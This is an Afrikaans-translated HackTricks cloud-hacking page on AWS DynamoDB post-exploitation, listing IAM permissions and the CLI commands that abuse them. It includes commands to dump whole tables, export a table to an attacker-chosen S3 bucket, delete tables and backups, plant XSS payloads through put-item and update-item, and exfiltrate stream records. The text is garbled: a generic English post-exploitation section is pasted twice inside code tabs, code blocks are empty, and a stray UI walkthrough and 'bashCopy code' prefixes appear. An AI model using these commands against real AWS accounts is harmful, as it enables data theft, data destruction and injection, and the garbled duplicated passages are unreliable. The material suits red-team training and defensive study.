# AWS - DynamoDB Post Exploitation

<details>

<summary><strong>Leer AWS-hacking vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy jou **maatskappy geadverteer wil sien in HackTricks** of **HackTricks in PDF wil aflaai**, kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** üí¨ [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Deel jou hacktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-repos.

</details>

## DynamoDB

Vir meer inligting, kyk:

{% content-ref url="../aws-services/aws-dynamodb-enum.md" %}
[aws-dynamodb-enum.md](../aws-services/aws-dynamodb-enum.md)
{% endcontent-ref %}

### `dynamodb:BatchGetItem`

'n Aanvaller met hierdie toestemmings sal in staat wees om **items van tabelle te kry deur die prim√™re sleutel** (jy kan nie net vir al die data van die tabel vra nie). Dit beteken dat jy die prim√™re sleutels moet weet (jy kan dit kry deur die tabelmetadata te kry (`describe-table`).

{% tabs %}
{% tab title="json-l√™er" %}
{% code overflow="wrap" %}
```bash
aws dynamodb batch-get-item --request-items file:///tmp/a.json

// With a.json
{
"ProductCatalog" : { // This is the table name
"Keys": [
{
"Id" : { // Primary keys name
"N": "205" // Value to search for, you could put here entries from 1 to 1000 to dump all those
}
}
]
}
}
```
{% endcode %}
{% endtab %}

{% tab title="inline" %}
{% code overflow="wrap" %}
```bash
aws dynamodb batch-get-item \
--request-items '{"TargetTable": {"Keys": [{"Id": {"S": "item1"}}, {"Id": {"S": "item2"}}]}}' \
--region <region>
```
{% endcode %}
{% endtab %}
{% endtabs %}

**Potensi√´le Impak:** Indirekte privesc deur sensitiewe inligting in die tabel te vind

### `dynamodb:GetItem`

**Soortgelyk aan die vorige toestemmings**, maak hierdie toestemming dit moontlik vir 'n potensi√´le aanvaller om waardes van net 1 tabel te lees deur die prim√™re sleutel van die inskrywing te gebruik om dit op te haal:

{% code overflow="wrap" %}
```json
aws dynamodb get-item --table-name ProductCatalog --key  file:///tmp/a.json

// With a.json
{
"Id" : {
"N": "205"
}
}
```
{% endcode %}

Met hierdie toestemming is dit ook moontlik om die **`transact-get-items`** metode te gebruik soos:

```json
aws dynamodb transact-get-items \
--transact-items file:///tmp/a.json

// With a.json
[
{
"Get": {
"Key": {
"Id": {"N": "205"}
},
"TableName": "ProductCatalog"
}
}
]
```

**Potensi√´le Impak:** Indirekte privesc deur sensitiewe inligting in die tabel te vind

### `dynamodb:Query`

**Soortgelyk aan die vorige toestemmings** maak hierdie toestemming 'n potensi√´le aanvaller in staat om waardes van net 1 tabel te lees deur die prim√™re sleutel van die inskrywing te gebruik om dit te herwin. Dit maak gebruik van 'n [subset van vergelykings](https://docs.aws.amazon.com/amazondynamodb/latest/APIReference/API\_Condition.html), maar die enigste vergelyking wat toegelaat word met die prim√™re sleutel (wat moet verskyn) is "EQ", so jy kan nie 'n vergelyking gebruik om die hele databasis in 'n versoek te kry nie.

{% tabs %}
{% tab title="json-l√™er" %}
{% code overflow="wrap" %}
```bash
aws dynamodb query --table-name ProductCatalog --key-conditions file:///tmp/a.json

// With a.json
{
"Id" : {
"ComparisonOperator":"EQ",
"AttributeValueList": [ {"N": "205"} ]
}
}
```
{% endcode %}
{% endtab %}

{% tab title="inline" %}
```bash
aws dynamodb query \
--table-name TargetTable \
--key-condition-expression "AttributeName = :value" \
--expression-attribute-values '{":value":{"S":"TargetValue"}}' \
--region <region>
```
{% endtab %}
{% endtabs %}

**Potensi√´le Impak:** Indirekte privesc deur sensitiewe inligting in die tabel te vind

### `dynamodb:Scan`

Jy kan hierdie toestemming gebruik om die hele tabel maklik te **dump**.

```bash
aws dynamodb scan --table-name <t_name> #Get data inside the table
```

**Potensi√´le Impak:** Indirekte privesc deur sensitiewe inligting in die tabel te vind

### `dynamodb:PartiQLSelect`

Jy kan hierdie toestemming gebruik om die hele tabel maklik te **dump**.

```bash
aws dynamodb execute-statement \
--statement "SELECT * FROM ProductCatalog"
```

Hierdie toestemming maak dit ook moontlik om `batch-execute-statement` uit te voer soos:

```bash
aws dynamodb batch-execute-statement \
--statements '[{"Statement": "SELECT * FROM ProductCatalog WHERE Id = 204"}]'
```

### `dynamodb:ExportTableToPointInTime|(dynamodb:UpdateContinuousBackups)`

Hierdie toestemming sal 'n aanvaller in staat stel om die hele tabel na 'n S3-emmer van sy keuse te **uitvoer**.

```bash
aws dynamodb export-table-to-point-in-time \
--table-arn arn:aws:dynamodb:<region>:<account-id>:table/TargetTable \
--s3-bucket <attacker_s3_bucket> \
--s3-prefix <optional_prefix> \
--export-time <point_in_time> \
--region <region>
```

Let wel dat die tabel punt-in-tyd-herstel moet aktiveer wees, jy kan nagaan of die tabel dit het met:

```bash
aws dynamodb describe-continuous-backups \
--table-name <tablename>
```

As dit nie geaktiveer is nie, sal jy dit moet **aktiveer** en daarvoor benodig jy die **`dynamodb:ExportTableToPointInTime`** toestemming:

```bash
aws dynamodb update-continuous-backups \
--table-name <value> \
--point-in-time-recovery-specification PointInTimeRecoveryEnabled=true
```

**Potensi√´le Impak:** Indirekte privesc deur sensitiewe inligting in die tabel op te spoor

### `dynamodb:CreateTable`, `dynamodb:RestoreTableFromBackup`, (`dynamodb:CreateBackup)`

Met hierdie toestemmings sal 'n aanvaller in staat wees om 'n nuwe tabel te skep vanuit 'n rugsteun (of selfs 'n rugsteun te skep om dit dan in 'n ander tabel te herstel). Dan, met die nodige toestemmings, sal hy in staat wees om inligting van die rugsteune te ondersoek wat nie meer in die produksie-tabel kan wees nie.

```bash
aws dynamodb restore-table-from-backup \
--backup-arn <source-backup-arn> \
--target-table-name <new-table-name> \
--region <region>
```

**Potensi√´le Impak:** Indirekte privesc deur sensitiewe inligting in die tafel se rugsteun te vind

### `dynamodb:PutItem`

Hierdie toestemming stel gebruikers in staat om 'n **nuwe item by die tafel te voeg of 'n bestaande item te vervang** met 'n nuwe item. As 'n item met dieselfde prim√™re sleutel reeds bestaan, sal die **volledige item vervang** word met die nuwe item. As die prim√™re sleutel nie bestaan nie, sal 'n nuwe item met die gespesifiseerde prim√™re sleutel **geskep** word.

{% tabs %}
{% tab title="XSS Voorbeeld" %}
{% code overflow="wrap" %}
```
```
{% endcode %}

```bash
## Create new item with XSS payload
aws dynamodb put-item --table <table_name> --item file://add.json
### With add.json:
{
"Id": {
"S": "1000"
},
"Name": {
"S":  "Marc"
},
"Description": {
"S": "<script>alert(1)</script>"
}
}
```

### AWS DynamoDB Post-Exploitation

#### Introduction

Once you have successfully gained access to an AWS DynamoDB instance, there are several post-exploitation techniques you can use to gather information, escalate privileges, and maintain persistence. This section will cover some of the most common post-exploitation techniques for AWS DynamoDB.

#### 1. Information Gathering

**1.1. Enumerate Tables**

To gather information about the tables in the DynamoDB instance, you can use the `ListTables` API call. This will return a list of all the tables in the instance.

```plaintext
aws dynamodb list-tables
```

**1.2. Describe Table**

To get detailed information about a specific table, you can use the `DescribeTable` API call. This will provide information such as the table name, attribute definitions, key schema, and provisioned throughput.

```plaintext
aws dynamodb describe-table --table-name <table_name>
```

#### 2. Privilege Escalation

**2.1. Access Control Policies**

Check the access control policies associated with the DynamoDB instance to identify any misconfigurations or overly permissive permissions. Look for policies that grant excessive privileges to certain IAM roles or users.

**2.2. Exploiting Weak IAM Policies**

If you find any weak IAM policies, you can exploit them to escalate your privileges. For example, if you find a policy that allows the `dynamodb:PutItem` action on all tables, you can use it to insert malicious data into any table.

#### 3. Persistence

**3.1. Backdoor Access**

To maintain persistence in the DynamoDB instance, you can create a backdoor access mechanism. This can be achieved by creating a new IAM user or role with the necessary permissions and using it to access the instance.

**3.2. Data Exfiltration**

If you want to exfiltrate data from the DynamoDB instance, you can use the `Scan` API call to retrieve all the items in a table. You can then export the data to a file or send it to an external server.

#### Conclusion

Post-exploitation in AWS DynamoDB involves gathering information, escalating privileges, and maintaining persistence. By understanding these techniques, you can effectively exploit and control a compromised DynamoDB instance.

```bash
aws dynamodb put-item \
--table-name ExampleTable \
--item '{"Id": {"S": "1"}, "Attribute1": {"S": "Value1"}, "Attribute2": {"S": "Value2"}}' \
--region <region>
```
{% endtab %}
{% endtabs %}

**Potensi√´le Impak:** Uitbuiting van verdere kwesbaarhede/oorsprong deur in staat te wees om data in 'n DynamoDB-tabel by te voeg/wysig

### `dynamodb:UpdateItem`

Hierdie toestemming stel gebruikers in staat om **die bestaande eienskappe van 'n item te wysig of nuwe eienskappe by 'n item te voeg**. Dit **vervang nie** die hele item nie; dit wysig slegs die gespesifiseerde eienskappe. As die prim√™re sleutel nie in die tabel bestaan nie, sal die operasie 'n nuwe item skep met die gespesifiseerde prim√™re sleutel en die eienskappe wat in die opdateeruitdrukking gespesifiseer is.

{% tabs %}
{% tab title="XSS Voorbeeld" %}
{% code overflow="wrap" %}
```
```
{% endcode %}

```bash
## Update item with XSS payload
aws dynamodb update-item --table <table_name> \
--key file://key.json --update-expression "SET Description = :value" \
--expression-attribute-values file://val.json
### With key.json:
{
"Id": {
"S": "1000"
}
}
### and val.json
{
":value": {
"S": "<script>alert(1)</script>"
}
}
```

### AWS DynamoDB Post-Exploitation

#### Introduction

Once you have successfully gained access to an AWS DynamoDB instance, there are several post-exploitation techniques you can use to gather information, escalate privileges, and maintain persistence. This section will cover some of the most common post-exploitation techniques for AWS DynamoDB.

#### 1. Information Gathering

**1.1. Enumerate Tables**

To gather information about the tables in the DynamoDB instance, you can use the `ListTables` API call. This will return a list of all the tables in the instance.

```plaintext
aws dynamodb list-tables
```

**1.2. Describe Table**

To get detailed information about a specific table, you can use the `DescribeTable` API call. This will provide information such as the table name, attribute definitions, key schema, and provisioned throughput.

```plaintext
aws dynamodb describe-table --table-name <table_name>
```

#### 2. Privilege Escalation

**2.1. Access Control Policies**

Check the access control policies associated with the DynamoDB instance to identify any misconfigurations or overly permissive permissions. Look for policies that grant excessive privileges to certain IAM roles or users.

**2.2. Exploiting Weak IAM Policies**

If you find any weak IAM policies, you can exploit them to escalate your privileges. For example, if you find a policy that allows the `dynamodb:PutItem` action on all tables, you can use it to insert malicious data into any table.

#### 3. Persistence

**3.1. Backdoor Access**

To maintain persistence in the DynamoDB instance, you can create a backdoor access mechanism. This can be achieved by creating a new IAM user or role with the necessary permissions and using it to access the instance.

**3.2. Data Exfiltration**

If you want to exfiltrate data from the DynamoDB instance, you can use the `Scan` API call to retrieve all the items in a table. You can then export the data to a file or send it to an external server.

#### Conclusion

Post-exploitation in AWS DynamoDB involves gathering information, escalating privileges, and maintaining persistence. By understanding these techniques, you can effectively exploit and control a compromised DynamoDB instance.

```bash
aws dynamodb update-item \
--table-name ExampleTable \
--key '{"Id": {"S": "1"}}' \
--update-expression "SET Attribute1 = :val1, Attribute2 = :val2" \
--expression-attribute-values '{":val1": {"S": "NewValue1"}, ":val2": {"S": "NewValue2"}}' \
--region <region>
```
{% endtab %}
{% endtabs %}

**Potensi√´le Impak:** Uitbuiting van verdere kwesbaarhede/oorsprong deur in staat te wees om data in 'n DynamoDB-tabel by te voeg/wysig

### `dynamodb:DeleteTable`

'n Aanvaller met hierdie toestemming kan 'n DynamoDB-tabel **verwyder, wat tot dataverlies kan lei**.

```bash
aws dynamodb delete-table \
--table-name TargetTable \
--region <region>
```

**Potensi√´le impak**: Data verlies en ontwrigting van dienste wat afhanklik is van die verwyderde tabel.

### `dynamodb:DeleteBackup`

'n Aanvaller met hierdie toestemming kan 'n DynamoDB-rugsteun verwyder, wat potensieel data verlies kan veroorsaak in geval van 'n rampherstel scenario.

```bash
aws dynamodb delete-backup \
--backup-arn arn:aws:dynamodb:<region>:<account-id>:table/TargetTable/backup/BACKUP_ID \
--region <region>
```

**Potensi√´le impak**: Data verlies en onvermo√´ om te herstel van 'n rugsteun tydens 'n rampherstel scenario.

### `dynamodb:StreamSpecification`, `dynamodb:UpdateTable`, `dynamodb:DescribeStream`, `dynamodb:GetShardIterator`, `dynamodb:GetRecords`

{% hint style="info" %}
TODO: Toets of dit werklik werk
{% endhint %}

'n Aanvaller met hierdie toestemmings kan **'n stroom op 'n DynamoDB-tabel aktiveer, die tabel opdateer om veranderinge te stroom, en dan toegang verkry tot die stroom om veranderinge aan die tabel in werklike tyd te monitor**. Dit stel die aanvaller in staat om veranderinge in data te monitor en uit te voer, wat moontlik kan lei tot data lekkasie.

1. Aktiveer 'n stroom op 'n DynamoDB-tabel:

```bash
bashCopy codeaws dynamodb update-table \
--table-name TargetTable \
--stream-specification StreamEnabled=true,StreamViewType=NEW_AND_OLD_IMAGES \
--region <region>
```

2. Beskryf die stroom om die ARN en ander besonderhede te verkry:

Om die ARN (Amazon Resource Name) en ander besonderhede van 'n stroom te verkry, kan jy die volgende stappe volg:

1. Maak verbinding met die AWS-beheerkonsol en navigeer na die DynamoDB-diens.
2. Kies die relevante tafel waarop die stroom geaktiveer is.
3. Klik op die "Strome" -opsie in die navigasiepaneel aan die linkerkant.
4. Kies die spesifieke stroom wat jy wil ondersoek.
5. In die stroombesonderhede-afdeling sal jy die ARN en ander relevante inligting vind, soos die stroomstatus, die bron van die stroom, en die tyd waarop dit geskep is.

Deur hierdie stappe te volg, sal jy die ARN en ander besonderhede van die stroom suksesvol kan verkry.

```bash
bashCopy codeaws dynamodb describe-stream \
--table-name TargetTable \
--region <region>
```

3. Kry die skerf-iterator deur die stroom ARN te gebruik:

```bash
bashCopy codeaws dynamodbstreams get-shard-iterator \
--stream-arn <stream_arn> \
--shard-id <shard_id> \
--shard-iterator-type LATEST \
--region <region>
```

4. Gebruik die shard-iterateur om toegang te verkry en data uit die stroom te eksfiltreer:

```bash
bashCopy codeaws dynamodbstreams get-records \
--shard-iterator <shard_iterator> \
--region <region>
```

**Potensi√´le impak**: Werklike tyd monitering en data lekkasie van die veranderinge aan die DynamoDB-tabel.

<details>

<summary><strong>Leer AWS-hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat**, kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** üí¨ [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Deel jou hacking-truuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-repos.

</details>
